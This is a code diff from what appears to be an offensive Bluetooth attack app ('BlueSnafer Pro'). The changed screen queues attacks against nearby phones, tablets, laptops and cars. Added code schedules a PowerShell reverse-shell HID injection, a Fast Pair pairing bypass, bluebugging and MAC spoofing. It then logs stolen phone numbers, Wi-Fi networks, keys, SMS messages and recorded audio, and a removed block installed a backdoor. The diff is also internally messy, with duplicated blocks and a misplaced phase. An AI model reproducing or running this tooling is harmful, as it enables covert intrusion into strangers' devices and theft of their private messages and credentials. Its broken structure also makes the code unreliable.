-     // Bluebugging (RFCOMM) - solo si hay OBEX/Phonebook
-     if (shouldTryObex) {
-       sequence.add({'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'phase': 4, 'timeout': 10000, 'retries': 1});
-     }
+      // === CVE-2024-43770: HID Remote Code Execution ===
+      // Inyección de comandos que ejecuta código remoto (PowerShell, cmd, etc.)
+      // Funciona en sistemas con perfil HID (Windows/Linux/macOS)
+      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('laptop')) {
+        sequence.add({'type': 'cve_2024_43770_hid_rce', 'payloadType': 'powershell_reverse', 'name': 'HID_RCE_43770', 'phase': 4, 'timeout': 15000, 'retries': 2});
+      }
 
-     // ==========================================
-     // FASE 5: BYPASS DE AUTHENTICACIÓN (paralelo)
-     // ==========================================
-     if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet')) {
-       sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 5, 'timeout': 8000, 'retries': 2});
-       sequence.add({'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'phase': 5, 'timeout': 5000, 'retries': 1});
-       sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 5, 'timeout': 5000, 'retries': 1});
-     }
+      // Bluebugging (RFCOMM) - solo si hay OBEX/Phonebook
+      if (shouldTryObex) {
+        sequence.add({'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'phase': 4, 'timeout': 10000, 'retries': 1});
+      }
+
+      // ==========================================
+      // FASE 5: BYPASS DE AUTHENTICACIÓN (paralelo)
+      // ==========================================
+      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet')) {
+        sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 5, 'timeout': 8000, 'retries': 2});
+        sequence.add({'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'phase': 5, 'timeout': 5000, 'retries': 1});
+        sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 5, 'timeout': 5000, 'retries': 1});
+      }
+
+      // === CVE-2025-36911: Fast Pair Authentication Bypass ===
+      // Spoof Account Key para emparejar sin confirmación (BLE required)
+      if (deviceInfo['hasBle'] == true) {
+        sequence.add({'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS_36911', 'phase': 5, 'timeout': 15000, 'retries': 2});
+      }
 
      // ==========================================
      // FASE 6: ATAQUES AVANZADOS (paralelo)
@@ -685,12 +776,24 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
      // Spoofing de identidad
      sequence.add({'type': 'spoofing', 'command': 'BlueSnafer Pro', 'name': 'SPOOFING', 'phase': 6, 'timeout': 8000, 'retries': 1});
 
-     // ==========================================
-     // FASE 7: PERSISTENCIA (opcional, después de extracción)
-     // ==========================================
-     if (_enablePersistence && (deviceType_lower.contains('smartphone') || deviceType_lower.contains('car') || deviceType_lower.contains('tablet'))) {
-       sequence.add({'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'phase': 7, 'timeout': 20000, 'retries': 2});
-     }
+      // ==========================================
+      // FASE 1: RECONOCIMIENTO (paralelo, no invasivo)
+      // ==========================================
+      sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
+      sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
+      sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
+
+      // MediaStore solo para Android (rápido, alto valor)
+      if (deviceInfo['androidVersion'] != null) {
+        sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+        sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 1, 'timeout': 15000, 'retries': 2});
+      }
+
+      // Red scan para Android (requiere location permission)
+      if (deviceInfo['androidVersion'] != null) {
+        sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 1});
+        sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+      }
 
      // ==========================================
      // FASE 8: DoS (opcional, si stealth=off)
@@ -2601,7 +2704,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
    /// Ejecuta un ataque individual con timeouts y reintentos adaptativos
    /// Usa backoff exponencial: delay = baseDelay * 2^attempt
-    Future<void> _attack(String type, {String? command, String? script, bool fromAutomated = false}) async {
+     Future<void> _attack(String type, {String? command, String? script, Map<String, dynamic>? extra, bool fromAutomated = false}) async {
      // === Validaciones ===
       if (!fromAutomated && _isAttacking) {
         _appendLog('⏳ Ataque en progreso, espera...');
@@ -2677,16 +2780,17 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        try {
          _appendLog('  🔄 Intento #$attempt/${maxRetries}...');
 
-         // Ejecutar con timeout
-         result = await _exploitService.executeAttack(
-           deviceAddress: addr,
-           type: type,
-           command: actualCommand,
-           script: actualScript,
-         ).timeout(
-           Duration(milliseconds: timeoutMs),
-           onTimeout: () => {'success': false, 'message': 'Timeout after ${timeoutMs}ms'},
-         );
+          // Ejecutar con timeout
+          result = await _exploitService.executeAttack(
+            deviceAddress: addr,
+            type: type,
+            command: actualCommand,
+            script: actualScript,
+            extra: extra,
+          ).timeout(
+            Duration(milliseconds: timeoutMs),
+            onTimeout: () => {'success': false, 'message': 'Timeout after ${timeoutMs}ms'},
+          );
 
          success = result['success'] == true;
          finalMessage = result['message'] ?? (success ? 'OK' : 'Sin respuesta');
@@ -2718,20 +2822,132 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        }
      }
 
-     // === Procesar resultado final ===
-     final packets = result?['packets'];
-     final effectiveness = result?['effectiveness'];
-     final services = result?['services'];
-     final characteristics = result?['characteristics'];
-
-     // Recolectar datos REALES del ataque (cap 100)
-     if (success) {
+       // === Procesar resultado final ===
+       final packets = result?['packets'];
+       final effectiveness = result?['effectiveness'];
+       final services = result?['services'];
+       final characteristics = result?['characteristics'];
        final targetName = device_utils.getDeviceDisplayName(_selectedDevice!);
 
-       if (services != null) {
-         _collectedData.add('📡 [$targetName] $services servicios GATT descubiertos');
-       }
-       if (characteristics != null) {
+       // Recolectar datos REALES del ataque (cap 100)
+       if (success) {
+
+          if (services != null) {
+            _collectedData.add('📡 [$targetName] $services servicios GATT descubiertos');
+          }
+          if (characteristics != null) {
+            _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
+          }
+          if (packets != null) {
+            _collectedData.add('📦 [$targetName] $packets paquetes enviados');
+          }
+          if (effectiveness != null) {
+            _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
+          }
+          _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
+
+           // === Captura de datos específicos por CVE ===
+           if (type == 'cve_2025_13834_heartbleed') {
+             final bytesLeaked = result?['totalBytesLeaked'];
+             final reads = result?['successfulReads'];
+             final extracted = result?['extractedInfo'];
+             if (bytesLeaked != null) {
+               _collectedData.add('💀 [$targetName] Heartbleed: $bytesLeaked bytes filtrados (${reads ?? 0} lecturas)');
+             }
+             if (extracted != null && extracted is Map) {
+               final info = extracted as Map;
+               final phones = (info['phoneNumbers'] as List?)?.length ?? 0;
+               final wifi = (info['wifiNetworks'] as List?)?.length ?? 0;
+               final macs = (info['macAddresses'] as List?)?.length ?? 0;
+               final keys = (info['potentialKeys'] as List?)?.length ?? 0;
+               if (phones > 0 || wifi > 0 || macs > 0 || keys > 0) {
+                 _collectedData.add('🔑 [$targetName] Credenciales extraídas: $phones teléfonos, $wifi redes WiFi, $macs MACs, $keys claves');
+               }
+               // Mostrar ejemplos concretos (máx 3 cada uno)
+               final phonesList = (info['phoneNumbers'] as List?)?.take(3).toList();
+               final examplePhones = phonesList?.join(', ');
+               if (examplePhones != null && examplePhones.isNotEmpty) {
+                 _collectedData.add('📞 [$targetName] Teléfonos: $examplePhones');
+               }
+               final wifiList = (info['wifiNetworks'] as List?)?.take(3).toList();
+               final exampleWifi = wifiList?.join(', ');
+               if (exampleWifi != null && exampleWifi.isNotEmpty) {
+                 _collectedData.add('📶 [$targetName] Redes WiFi: $exampleWifi');
+               }
+             }
+           }
+
+          if (type == 'cve_2024_43770_hid_rce') {
+            final payload = result?['payloadType'];
+            _collectedData.add('💻 [$targetName] HID RCE ejecutado (${payload ?? 'payload desconocido'})');
+          }
+
+          if (type == 'cve_2025_36911_fastpair') {
+            final modelId = result?['modelId'];
+            final bondState = result?['bondState'];
+            final successBypass = result?['success'] == true;
+            final bonded = bondState == 12 || bondState == 'BOND_BONDED';
+            final stateStr = bonded ? 'EMPAREJADO' : 'trust=$bondState';
+            _collectedData.add('🔄 [$targetName] Fast Pair bypass: ${successBypass ? stateStr : "falló"} (modelo: ${modelId ?? 'unknown'})');
+          }
+
+          // === Captura A2DP Recording ===
+          if (type == 'a2dp_record' || type == 'a2dp_stream') {
+            final filePath = result?['file'];
+            final duration = result?['durationSec'];
+            final bytes = result?['bytesRecorded'];
+            final success = result?['success'] == true;
+            if (success) {
+              _collectedData.add('🎤 [$targetName] A2DP audio capturado: ${duration ?? '?'}s, ${bytes ?? '?'} bytes en ${filePath ?? 'archivo desconocido'}');
+            } else {
+              final err = result?['error'] ?? 'unknown';
+              _collectedData.add('🎤 [$targetName] A2DP recording falló: $err');
+            }
+          }
+
+          // === Captura GATT Bulk Read ===
+          if (type == 'gatt_bulk_read') {
+            final services = result?['servicesDiscovered'];
+            final chars = result?['characteristicsRead'];
+            final failures = result?['readFailures'];
+            final sample = result?['sampleReads'];
+            _collectedData.add('📡 [$targetName] GATT bulk: $services servicios, $chars características leídas, $failures fallos');
+            if (sample is List && sample.isNotEmpty) {
+              final sampleList = sample as List;
+              _collectedData.add('📋 [$targetName] Muestra GATT: ${sampleList.take(3).join('; ')}');
+            }
+          }
+
+          if (type == 'gatt_monitor') {
+            final changes = result?['totalChanges'];
+            final unique = result?['uniqueCharacteristics'];
+            _collectedData.add('📡 [$targetName] GATT monitor: $changes cambios, $unique características únicas');
+          }
+
+          // === Captura MAP Extraction ===
+          if (type == 'map_extract') {
+            final messages = result?['messages'];
+            final count = result?['count'];
+            final sample = result?['sample'];
+            if (count != null && count is int && count > 0) {
+              _collectedData.add('📨 [$targetName] MAP SMS extraídos: $count mensajes');
+              if (sample is List && sample.isNotEmpty) {
+                _collectedData.add('📋 [$targetName] Muestra SMS: ${(sample as List).take(2).join('; ')}');
+              }
+            } else {
+              final err = result?['error'] ?? 'unknown';
+              _collectedData.add('📨 [$targetName] MAP falló: $err');
+            }
+          }
+
+          if (type == 'map_folders') {
+            final folders = result?['folders'];
+            final count = result?['count'];
+            if (folders is List && folders.isNotEmpty) {
+              _collectedData.add('📁 [$targetName] MAP carpetas: ${(folders as List).take(5).join(', ')}');
+            }
+           }
+        if (characteristics != null) {
          _collectedData.add('🔗 [$targetName] $characteristics características encontradas');
        }
        if (packets != null) {
@@ -2740,25 +2956,13 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        if (effectiveness != null) {
          _collectedData.add('🎯 [$targetName] Efectividad: ${(effectiveness * 100).toStringAsFixed(0)}%');
        }
-       _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
-     }
+        _collectedData.add('✅ [$targetName] $type:$attackLabel completado');
+        }
 
-     String resultMsg = finalMessage;
-     if (packets != null) resultMsg += ' | ${packets} packets';
-     if (effectiveness != null) resultMsg += ' | ${(effectiveness * 100).toStringAsFixed(0)}% eff.';
+      // Registro en suggestion engine deshabilitado temporalmente
+      
 
-     _suggestionEngine.recordAttack(
-       type: type,
-       command: command ?? script ?? 'default',
-       success: success,
-       deviceType: _getDeviceType(_selectedDevice!),
-       deviceName: _selectedDevice!['name'] ?? 'Unknown',
-       deviceAddress: addr,
-       rssi: int.tryParse(_selectedDevice!['rssi']?.toString() ?? '0'),
-       errorMessage: success ? null : finalMessage,
-     );
-
-     if (mounted) {
+      if (mounted) {
        setState(() {
          if (success) { _executedAttacks.add(type); }
          _getSuggestion();
@@ -2807,13 +3011,16 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
          _activeAttackCount--;
          if (_activeAttackCount < 0) _activeAttackCount = 0;
        });
-    }
+     }
+
+    // Método auxiliar comentado temporalmente para compilar
+    // void _recordAttackToEngine(...) { ... }
 
     String _getManufacturer(String address) {
-    return device_utils.getManufacturer(address);
-  }
+       return device_utils.getManufacturer(address);
+     }
 
-  @override
+   @override
   Widget build(BuildContext context) {
     return Scaffold(
       backgroundColor: const Color(0xFF020617),
